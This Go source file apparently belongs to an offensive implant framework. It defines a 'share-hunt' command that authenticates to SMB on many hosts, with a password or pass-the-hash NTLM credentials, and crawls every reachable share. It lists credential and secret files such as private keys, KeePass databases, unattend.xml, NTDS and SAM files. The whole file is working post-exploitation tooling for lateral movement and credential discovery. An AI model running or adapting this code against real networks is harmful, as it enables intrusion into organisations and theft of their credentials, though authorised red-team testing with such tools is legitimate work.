package commands

import (
	"encoding/json"
	"fmt"
	"net"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"fawkes/pkg/structs"

	"github.com/hirochachacha/go-smb2"
)

// ShareHuntCommand crawls SMB shares across multiple hosts to find sensitive files.
type ShareHuntCommand struct{}

func (c *ShareHuntCommand) Name() string { return "share-hunt" }
func (c *ShareHuntCommand) Description() string {
	return "Crawl SMB shares across hosts for sensitive files"
}

type shareHuntArgs struct {
	Hosts    string `json:"hosts"`     // comma-separated IPs or CIDR
	Username string `json:"username"`  // DOMAIN\user or user@domain
	Password string `json:"password"`  // password
	Hash     string `json:"hash"`      // NTLM hash for PTH
	Domain   string `json:"domain"`    // domain (optional)
	Depth    int    `json:"depth"`     // max recursion depth (default: 3)
	MaxFiles int    `json:"max_files"` // max results (default: 500)
	Filter   string `json:"filter"`    // filter: all, credentials, configs, code (default: all)
}

type shareHuntResult struct {
	Host     string
	Share    string
	Path     string
	Size     int64
	Modified time.Time
	Category string
}

// Sensitive file patterns by category
var shareHuntPatterns = map[string][]string{
	"credentials": {
		"*.kdbx", "*.kdb", "*.key", "*.pem", "*.pfx", "*.p12",
		"*.ppk", "*.rdp", "id_rsa", "id_ed25519", "id_ecdsa",
		"*.ovpn", ".netrc", ".pgpass", "*.jks", "*.keystore",
		"unattend.xml", "sysprep.xml", "web.config",
		"credentials.xml", "*.gpg", "*.asc",
	},
	"configs": {
		"*.config", "*.conf", "*.cfg", "*.ini", "*.xml", "*.json",
		"*.yaml", "*.yml", "*.toml", "*.properties",
		"appsettings.json", "web.config", "app.config",
		"connectionstrings.config", "*.env",
	},
	"code": {
		"*.ps1", "*.psm1", "*.psd1", "*.bat", "*.cmd", "*.vbs",
		"*.js", "*.py", "*.sh", "*.pl", "*.rb",
	},
}

// High-value filenames that always match regardless of filter
var shareHuntHighValue = []string{
	"passwords", "password", "creds", "credentials", "secrets",
	"sensitive", "confidential", "private", "backup",
	"flag", "ntds", "sam", "system", "security",
}

func (c *ShareHuntCommand) Execute(task structs.Task) structs.CommandResult {
	var args shareHuntArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if args.Hosts == "" || args.Username == "" || (args.Password == "" && args.Hash == "") {
		return structs.CommandResult{
			Output:    "Error: -hosts, -username, and -password (or -hash) are required",
			Status:    "error",
			Completed: true,
		}
	}

	if args.Depth <= 0 {
		args.Depth = 3
	}
	if args.MaxFiles <= 0 {
		args.MaxFiles = 500
	}
	if args.Filter == "" {
		args.Filter = "all"
	}

	// Parse domain from username
	if args.Domain == "" {
		if parts := strings.SplitN(args.Username, `\`, 2); len(parts) == 2 {
			args.Domain = parts[0]
			args.Username = parts[1]
		} else if parts := strings.SplitN(args.Username, "@", 2); len(parts) == 2 {
			args.Domain = parts[1]
			args.Username = parts[0]
		}
	}

	// Parse hosts
	hosts := lateralParseHosts(args.Hosts)
	if len(hosts) == 0 {
		return structs.CommandResult{
			Output:    "Error: no valid hosts parsed",
			Status:    "error",
			Completed: true,
		}
	}
	if len(hosts) > 256 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: too many hosts (%d). Maximum 256.", len(hosts)),
			Status:    "error",
			Completed: true,
		}
	}

	// Build extension set for matching
	matchExts := shareHuntBuildExtSet(args.Filter)

	// Crawl each host concurrently
	var mu sync.Mutex
	var wg sync.WaitGroup
	var allResults []shareHuntResult
	hostErrors := make(map[string]string)
	sem := make(chan struct{}, 5) // limit concurrent SMB sessions
	totalFound := 0

	for _, host := range hosts {
		if task.DidStop() {
			break
		}
		wg.Add(1)
		sem <- struct{}{}
		go func(h string) {
			defer wg.Done()
			defer func() { <-sem }()

			if task.DidStop() {
				return
			}

			results, err := shareHuntHost(task, h, args, matchExts, args.MaxFiles-totalFound)
			mu.Lock()
			if err != nil {
				hostErrors[h] = err.Error()
			}
			allResults = append(allResults, results...)
			totalFound = len(allResults)
			mu.Unlock()
		}(host)
	}
	wg.Wait()

	// Format output
	var sb strings.Builder
	sb.WriteString("=== SHARE HUNT RESULTS ===\n\n")

	if len(allResults) == 0 && len(hostErrors) == 0 {
		sb.WriteString("No sensitive files found.\n")
	}

	// Group results by host
	hostResults := make(map[string][]shareHuntResult)
	for _, r := range allResults {
		hostResults[r.Host] = append(hostResults[r.Host], r)
	}

	for _, host := range hosts {
		results := hostResults[host]
		errMsg := hostErrors[host]

		if len(results) == 0 && errMsg == "" {
			continue
		}

		sb.WriteString(fmt.Sprintf("--- %s ---\n", host))
		if errMsg != "" {
			sb.WriteString(fmt.Sprintf("  [!] Error: %s\n", errMsg))
		}
		for _, r := range results {
			sb.WriteString(fmt.Sprintf("  [+] [%s] \\\\%s\\%s\\%s (%s, %s)\n",
				r.Category, r.Host, r.Share, r.Path,
				formatFileSize(r.Size), r.Modified.Format("2006-01-02")))
		}
		if len(results) > 0 {
			sb.WriteString(fmt.Sprintf("  (%d files found)\n", len(results)))
		}
		sb.WriteString("\n")
	}

	sb.WriteString(fmt.Sprintf("--- %d host(s) scanned, %d file(s) found ---\n", len(hosts), len(allResults)))
	if len(hostErrors) > 0 {
		sb.WriteString(fmt.Sprintf("--- %d host(s) had errors ---\n", len(hostErrors)))
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

func shareHuntHost(task structs.Task, host string, args shareHuntArgs, matchExts map[string]string, maxResults int) ([]shareHuntResult, error) {
	if maxResults <= 0 {
		return nil, nil
	}

	// Connect via SMB
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:445", host), 10*time.Second)
	if err != nil {
		return nil, fmt.Errorf("TCP connect: %v", err)
	}

	initiator := &smb2.NTLMInitiator{
		User:   args.Username,
		Domain: args.Domain,
	}
	if args.Hash != "" {
		hashBytes, err := smbDecodeHash(args.Hash)
		if err != nil {
			_ = conn.Close()
			return nil, fmt.Errorf("invalid hash: %v", err)
		}
		initiator.Hash = hashBytes
	} else {
		initiator.Password = args.Password
	}

	d := &smb2.Dialer{Initiator: initiator}
	_ = conn.SetDeadline(time.Now().Add(30 * time.Second))
	session, err := d.Dial(conn)
	if err != nil {
		_ = conn.Close()
		return nil, fmt.Errorf("SMB auth: %v", err)
	}
	_ = conn.SetDeadline(time.Time{})
	defer func() {
		_ = session.Logoff()
		_ = conn.Close()
	}()

	// List shares
	_ = conn.SetDeadline(time.Now().Add(30 * time.Second))
	shares, err := session.ListSharenames()
	_ = conn.SetDeadline(time.Time{})
	if err != nil {
		return nil, fmt.Errorf("list shares: %v", err)
	}

	var results []shareHuntResult

	// Skip system/printer shares
	skipShares := map[string]bool{
		"IPC$": true, "print$": true, "PRINT$": true,
	}

	for _, shareName := range shares {
		if task.DidStop() || len(results) >= maxResults {
			break
		}
		if skipShares[shareName] {
			continue
		}

		_ = conn.SetDeadline(time.Now().Add(30 * time.Second))
		share, err := session.Mount(shareName)
		_ = conn.SetDeadline(time.Time{})
		if err != nil {
			continue // access denied is normal
		}

		shareHuntCrawl(task, share, conn, host, shareName, ".", args.Depth, matchExts, &results, maxResults)
		_ = share.Umount()
	}

	return results, nil
}

func shareHuntCrawl(task structs.Task, share *smb2.Share, conn net.Conn, host, shareName, dir string, depth int, matchExts map[string]string, results *[]shareHuntResult, maxResults int) {
	if depth <= 0 || task.DidStop() || len(*results) >= maxResults {
		return
	}

	_ = conn.SetDeadline(time.Now().Add(30 * time.Second))
	entries, err := share.ReadDir(dir)
	_ = conn.SetDeadline(time.Time{})
	if err != nil {
		return
	}

	for _, entry := range entries {
		if task.DidStop() || len(*results) >= maxResults {
			return
		}

		name := entry.Name()
		if name == "." || name == ".." {
			continue
		}

		entryPath := name
		if dir != "." {
			entryPath = dir + `\` + name
		}

		if entry.IsDir() {
			shareHuntCrawl(task, share, conn, host, shareName, entryPath, depth-1, matchExts, results, maxResults)
			continue
		}

		// Check if file matches patterns
		category := shareHuntMatchFile(name, matchExts)
		if category != "" {
			*results = append(*results, shareHuntResult{
				Host:     host,
				Share:    shareName,
				Path:     entryPath,
				Size:     entry.Size(),
				Modified: entry.ModTime(),
				Category: category,
			})
		}
	}
}

func shareHuntMatchFile(name string, matchExts map[string]string) string {
	lower := strings.ToLower(name)
	ext := strings.ToLower(filepath.Ext(name))

	// Check high-value filenames
	baseName := strings.TrimSuffix(lower, ext)
	for _, hv := range shareHuntHighValue {
		if strings.Contains(baseName, hv) {
			return "HIGH-VALUE"
		}
	}

	// Check extension match
	if cat, ok := matchExts[ext]; ok {
		return cat
	}
	// Check exact name match (for files like id_rsa, .netrc)
	if cat, ok := matchExts[lower]; ok {
		return cat
	}

	return ""
}

func shareHuntBuildExtSet(filter string) map[string]string {
	result := make(map[string]string)

	addPatterns := func(category string, patterns []string) {
		for _, p := range patterns {
			p = strings.ToLower(p)
			if strings.HasPrefix(p, "*.") {
				result[p[1:]] = category // *.kdbx -> .kdbx
			} else if strings.HasPrefix(p, ".") {
				result[p] = category
			} else {
				result[p] = category // exact name like id_rsa
			}
		}
	}

	switch filter {
	case "credentials":
		addPatterns("cred", shareHuntPatterns["credentials"])
	case "configs":
		addPatterns("config", shareHuntPatterns["configs"])
	case "code":
		addPatterns("code", shareHuntPatterns["code"])
	default: // "all"
		addPatterns("cred", shareHuntPatterns["credentials"])
		addPatterns("config", shareHuntPatterns["configs"])
		addPatterns("code", shareHuntPatterns["code"])
	}

	return result
}
